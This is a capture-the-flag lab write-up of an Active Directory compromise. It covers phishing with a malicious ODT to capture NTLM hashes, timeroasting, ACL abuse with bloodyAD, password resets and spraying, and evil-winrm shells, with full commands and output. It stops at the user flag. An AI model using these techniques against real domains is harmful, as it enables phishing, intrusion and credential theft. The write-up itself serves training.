# HSM Defense — Hack Smarter Labs Writeup

<img width="900" height="312" alt="d177b89b-f2d5-4285-9b0f-b1ef248f0b67" src="https://github.com/user-attachments/assets/94e10125-9fe6-446f-9b8a-669d4e3c4de1" />


## Scenario

HSM Defense is a defense contractor requiring an in-depth penetration test against their internal Domain Controller. The objective is to demonstrate impact by elevating privileges to Domain Admin.

**Provided credentials:** `kelly.johnson:Lordofwar`

---

## Note

we will accept the challenge and start the machine as blackbox with no credentials

---

## 1. Reconnaissance & Enumeration

### Port Scanning

The target DC (`DC.hsm-defense.local` — `10.1.87.19`) exposes the following services:
```
PORT      STATE SERVICE       REASON  VERSION

25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

53/tcp    open  domain        syn-ack Simple DNS Plus

80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP

135/tcp   open  msrpc         syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn

143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: completed OK SORT IMAP4 IMAP4rev1 RIGHTS=texkA0001 NAMESPACE QUOTA ACL CAPABILITY IDLE CHILDREN

445/tcp   open  microsoft-ds? syn-ack

587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Issuer: commonName=DC.hsm-defense.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-31T17:16:05
| Not valid after:  2027-03-02T17:16:05
| MD5:   0242:3db7:4cd0:fa91:dd6f:dd0e:c00e:0244
| SHA-1: d4a1:bb1f:dbbc:2597:184d:86a9:92e3:b6c4:f1c3:b550
| -----BEGIN CERTIFICATE-----
| MIIC7DCCAdSgAwIBAgIQGcHLgRZHMI5LXk0IBE3OmDANBgkqhkiG9w0BAQsFADAf
| MR0wGwYDVQQDExREQy5oc20tZGVmZW5zZS5sb2NhbDAeFw0yNjA4MzExNzE2MDVa
| Fw0yNzAzMDIxNzE2MDVaMB8xHTAbBgNVBAMTFERDLmhzbS1kZWZlbnNlLmxvY2Fs
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtAu/bLFbw561L+AZz9jX
| 9Y7cGkMG9gLojw49vpnXNhbRSdic+s7lA7EiNHB91RhRdv8hal9ywdqR1ADD3vxV
| EVxjE3HWYzKkhuS6wxsheyKfG2k9P9yvHwGRruv/SL69LUJF81NQ7Zyrqcyaqfid
| pDNv80RKFKnbMeEA6SkdoV7Zidd2PRoTsSzH1JmeBmUCjPN8hAXi9zSQVYTM7qs9
| MVpNXu0gQYuEQYb5N/ElJVMvghCADpyaGdbA9Byg4JdwrcfAsdokRXF23GG+VFmV
| ANuQevZTyyLLXW/S2q0kDX+MVVxR3lvWKMziWTwKyHJGJw7U1ijqkcm5QnoLQBhq
| jQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
| KoZIhvcNAQELBQADggEBAF0F/PdbCkxFSetU95r4X0OEAu41x8U86nXZDty3Ffk9
| Il4taU0Ffgmra9Rwb//xbKXMwURQfR0jeepLtCs+j6D0AVGZC1gDvO0wej5yXr88
| VzsL+nfD/51nmcpmM173a3ZKrL01c05kEJOYb/DSIqBQERAAbwX4NriaTUTzf0ok
| EybAr4YcNx/3udbn6mGwS5vmrJWr5lSJkq9ECe2HdEbXkhb0z+8t75ROjGXPyZcn
| TTtEZZWOGej7wtCA1vOTKiejWPjM1WBOJBlCwp+2Ej5Hrw4QAgtZdeUuz7Q1uPDK
| sROEd6eWuJp+hFhAaO+UUj92HJwK0qbMHlQ28mFFKLI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-17T19:17:41+00:00; -1s from scanner time.

5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-17T19:17:32
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41331/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33689/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37083/udp): CLEAN (Timeout)
|   Check 4 (port 17349/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 17 20:17:48 2026 -- 1 IP address (1 host up) scanned in 172.77 seconds
```

### SMB Enumeration

Since NTLM authentication is disabled on the DC, all authentication must use Kerberos. We generate the necessary hosts file entry and `krb5.conf`:

```
nxc smb 10.1.87.19 -u guest -p '' --generate-hosts-file hsm-defense-host
nxc smb DC.hsm-defense.local -u 'guest' -p '' --generate-krb5-file /etc/krb5.conf -k
```

Add to `/etc/hosts`:

```
10.1.212.125 DC.hsm-defense.local hsm-defense.local DC

```

### Web Enumeration

A VHOST fuzz discovers `support.hsm-defense.local`:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.hsm-defense.local" -u http://hsm-defense.local -fw 23339
```

The careers portal invites applications via `careers@hsm-defense.local` in **ODT/ODP format** — a classic phishing vector.

---

## 2. Initial Access — Phishing with Malicious ODT

### Crafting the Payload

Using this python scripts `badodt.py` `https://github.com/rmdavy/badodf/blob/master/badodt.py` , we generate an ODT file that forces an outbound SMB connection when opened:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ python3 badodt.py 
/home/donmed/LAB/Hacksmarter/Defense/badodt.py:13: SyntaxWarning: invalid escape sequence '\/'
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
Python3 version by @gustanini
www.secureyourit.co.uk


Please enter IP of listener: 10.200.96.99
/home/donmed/LAB/Hacksmarter/Defense/bad.odt successfully created

```

### Setting Up Responder

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ sudo responder -I tun0
[sudo] password for donmed: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.200.96.99]
    Responder IPv6             [fe80::b863:9d1f:d00a:ac25]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-1NL3TWE6ZTT]
    Responder Domain Name      [NS8W.LOCAL]
    Responder DCE-RPC Port     [48308]

[+] Listening for events...

[*] Skipping previously captured hash for HSMDEFENSE\kelly.johnson

```

### Delivering the Phish

```
swaks --to 'careers@hsm-defense.local' --from 'attacker@evil.com' \
  --attach @bad.odt --server 10.1.87.19:25
```

When `kelly.johnson` opens the document, her machine authenticates to our SMB share, leaking an **NTLMv2 hash** that we crack with hashcat:

```
hashcat -m 5600 kelly.hash /usr/share/wordlists/rockyou.txt
```

**Cracked:** `kelly.johnson:Lordofwar`

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb 10.1.212.125 -u kelly.johnson -p Lordofwar -k 
SMB         10.1.212.125    445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.1.212.125    445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar

```

---

## 3. Domain Enumeration with BloodHound

```
nxc ldap hsm-defense.local -u kelly.johnson -p Lordofwar -k --bloodhound --collection all --dns-server 10.1.212.125
```

Key findings:

- `kelly.johnson` is a member of **`it-ticket-handlers`**


<img width="1154" height="593" alt="image" src="https://github.com/user-attachments/assets/1850df11-cd61-4e15-ad4d-f47e31ef34f5" />

- The only Domain Admin is **Administrator**
  
<img width="900" height="336" alt="image" src="https://github.com/user-attachments/assets/d12051d6-8ad1-4fb4-9e1d-cbb51262cea4" />

---

## 4. Support Portal Access

Using `kelly.johnson` credentials, we log into `http://support.hsm-defense.local/`. The portal contains tickets with sensitive information:

- **Ticket 2417:** A password was manually set on the `HELPDESK01$` machine account
- 
<img width="1509" height="682" alt="image" src="https://github.com/user-attachments/assets/79e353fe-62fc-4a48-af62-4d063498c354" />

- **Ticket 2422:** `jason.caldwell` is locked out (`KDC_ERR_CLIENT_REVOKED`) due to incorrectly configured logon hours
  
<img width="1514" height="634" alt="image" src="https://github.com/user-attachments/assets/c2bf333c-1b5c-4949-a456-d446f6e1e044" />


---

## 5. Timeroasting — Extracting Machine Account Hashes

Ticket 2417 reveals `HELPDESK01$` has a manually-set password — likely weak and crackable.

Timeroasting abuses Microsoft's proprietary NTP extension to extract password-equivalent hashes without authentication:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb DC.hsm-defense.local -u kelly.johnson -p Lordofwar -k -M timeroast
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   DC.hsm-defense.local 445    DC               [*] Starting Timeroasting...
TIMEROAST   DC.hsm-defense.local 445    DC               1000:$sntp-ms$152708e2d63f966b7efe57d016151f51$1c0111e900000000000a02d44c4f434cee5a8ac715fdb31ee1b8428bffbfcd0aee5a8e82ce0deb7bee5a8e82ce0e2ce9
TIMEROAST   DC.hsm-defense.local 445    DC               1105:$sntp-ms$1dd6ac2716217440b4da4865eb396a55$1c0111e900000000000a02d54c4f434cee5a8ac71478c50de1b8428bffbfcd0aee5a8e837478a6daee5a8e837478d5d4
TIMEROAST   DC.hsm-defense.local 445    DC               1122:$sntp-ms$4e80e23be3c1df7cca0dbeb8235c83ae$1c0111e900000000000a02d54c4f434cee5a8ac71648c56be1b8428bffbfcd0aee5a8e838a406a53ee5a8e838a40ad6f

```

This returns three SNTP hashes. We crack them with hashcat mode **31300**:

```
hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt
```

**Cracked:** `HELPDESK01$:<password>`

---

## 6. ServiceDesk Group Takeover

BloodHound reveals `HELPDESK01$` has **WriteOwner** on the `servicedesk` group. 

<img width="753" height="372" alt="image" src="https://github.com/user-attachments/assets/a0929d8b-31a7-4d72-92d8-a05c86291341" />

The `servicedesk` group has **ForceChangePassword** over `jason.caldwell`, `ethan.mercer`, and `luke.harrison`.

<img width="1024" height="591" alt="image" src="https://github.com/user-attachments/assets/a492c156-d11f-4ade-8de1-21e45f21330d" />


### Step 1: Set Ownership

```
1. First generate the ST of HELPDESK01$

┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ impacket-getTGT 'hsm-defense.local/HELPDESK01$:Password123' -dc-ip 10.1.212.125
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

2. Export the Ticket

[*] Saving ticket in HELPDESK01$.ccache
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=HELPDESK01$.ccache

3. take the ownership of SERVERDESK group

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set owner 'servicedesk' 'HELPDESK01$'

```

### Step 2: Grant GenericAll

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' add genericAll 'servicedesk' 'HELPDESK01$'
```

### Step 3: Add Machine Account to Group

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' add groupMember 'servicedesk' 'HELPDESK01$'
```

### Step 4: Reset Passwords of `jason.caldwell`, `ethan.mercer`, and `luke.harrison`.

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set password jason.caldwell 'Pwned123@!'
```

Authentication as `jason.caldwell` fails with `KDC_ERR_CLIENT_REVOKED` — exactly as Ticket 2422 described. We pivot to `luke.harrison`.

---

## 7. Access as luke.harrison — LogonHours Manipulation

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set password luke.harrison 'Pwned123@!'

```

Authentication succeeds. Now we enumerate writable objects:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ impacket-getTGT 'hsm-defense.local/luke.harrison:NewPass123!' -dc-ip 10.1.212.125
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in luke.harrison.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=luke.harrison.ccache 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
logonHours: WRITE <------ HERE

distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD  
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD


```

**Key finding:** `luke.harrison` has **WriteProperty** on `jason.caldwell`'s `logonHours` attribute — a relationship not visible in BloodHound.

### Clear the LogonHours Restriction

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' set object jason.caldwell logonHours

```

Now `jason.caldwell` can authenticate:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ nxc smb -k DC.hsm-defense.local -u 'jason.caldwell' -p 'NewPass123!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\jason.caldwell:NewPass123!

```

### WinRM Shell as jason.caldwell

<img width="645" height="324" alt="image" src="https://github.com/user-attachments/assets/59195281-6c22-4169-90b0-5d6791aff701" />


```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/jason.caldwell:'NewPass123!'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jason.caldwell.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=jason.caldwell.ccache 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> 

```

---

## 8. MariaDB Credential Discovery

On the DC, MariaDB runs internally on port **3306**:

<img width="1260" height="774" alt="image" src="https://github.com/user-attachments/assets/66c23938-5eb4-4237-bea0-1d45b2390fab" />


The installation folder is `C:\Program Files\MariaDB 10.6`. Reading `my.ini` reveals database credentials:

```

*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> type "C:\Program Files\MariaDB 10.6\data\my.ini"
 
[mysqld]
datadir=C:/Program Files/MariaDB 10.6/data
port=3306
bind-address=127.0.0.1
innodb_buffer_pool_size=511M

[client]
port=3306
plugin-dir=C:\Program Files\MariaDB 10.6/lib/plugin

[internal_app]
database_host=127.0.0.1
database_user=root
database_password=pa$$w0rd12

```

Enumerate the `new_employees` database:

```
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -p'pa$$w0rd12' -e "SHOW DATABASES;"
Database
hsm_defense
information_schema
mysql
new_employees
performance_schema
sys
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -p'pa$$w0rd12' -D new_employees -e "SELECT * FROM employees;"
id	username	password
1	aaron.pierce	d482a055616317f569cd1ab90325479e
2	nathan.reed	d482a055616317f569cd1ab90325479e
4	adam.brooks	f3a4f28a0aaf388c0ce16a6011acf511
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> 

```

Three **MD5 hashes** are recovered. Cracking one that appears twice:

```
hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. Password Spraying — Access as caleb.turner

Spray the cracked password across domain users:

```
nxc smb -k DC.hsm-defense.local -u valid_users.txt -p '//newpassword123' --continue-on-success | grep '\[+\]'
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\aaron.pierce://newpassword123 
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\caleb.turner://newpassword123

```

**Two hits:** `aaron.pierce` and `caleb.turner`

BloodHound shows `caleb.turner` is a member of **Remote Management Users** and **IT OU Operators**.

<img width="714" height="505" alt="image" src="https://github.com/user-attachments/assets/1461c2ca-b6b3-4bc6-a56f-33f66cbc028f" />


### WinRM Shell as caleb.turner

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/caleb.turner:'//newpassword123'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in caleb.turner.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=caleb.turner.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\caleb.turner\Documents>

```

**User flag found:** `C:\Users\caleb.turner\Desktop\user.txt`

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\caleb.turner\Documents> cat ../Desktop/user.txt

FLAG{$flag}


⠀⠀⠀⣠⣴⠶⠶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⢟⡵⠿⣿⣷⡄⢻⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⢣⣿⣿⣶⣌⣙⡇⣸⠻⣎⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠸⡍⠻⣿⣿⠟⣰⣇⠀⢄⠑⢈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⢦⣈⣉⣉⣴⡞⠁⠀⠁⠐⢿⣾⣯⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠯⣝⡻⠦⡄⠈⣢⣾⣿⡿⠀⠀⠙⢦⡀⢀⣀⣀⣀⣠⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠓⠚⠛⠿⣿⣿⣥⡀⠀⠀⠀⠙⢯⣭⣤⣤⣤⣤⣤⣄⠀⣽⢉⠓⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣌⠒⢤⡠⣀⠀⢹⣿⡌⠈⠉⠋⡇⠀⡇⣸⠙⠓⠦⣍⣓⣦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣦⣉⣂⣑⣶⡟⢡⠀⠀⢸⠁⢰⣃⣟⣄⣀⣀⣐⣻⡼⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣿⣩⣿⣿⣏⣉⣭⣥⡤⣧⡶⠒⠛⠛⠛⠛⣿⡟⠿⠿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠞⡩⡉⢁⠀⣼⣣⠟⠉⠁⠀⡀⠀⠀⣴⢋⣦⠎⢀⣠⡶⠛⣡⢿⡶⠦⣤⣈⡙⠻⢦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡧⠾⠿⣷⣿⣿⡿⢁⠎⣠⢀⣾⣀⣀⣞⣿⠭⢭⣭⢿⣿⣷⢾⣧⡾⠿⠷⢾⡯⣍⣳⡦⣌⡛⠦⣄⠀⠀
⠀⠀⠀⠀⠀⢨⣟⣋⣿⣏⣻⡿⢿⠋⠹⡉⢉⠉⠉⢏⢹⡿⡾⣶⣿⡾⣿⢷⣿⡏⣴⣿⣿⣦⢻⣶⣬⣹⣶⣿⡳⣌⢻⡆
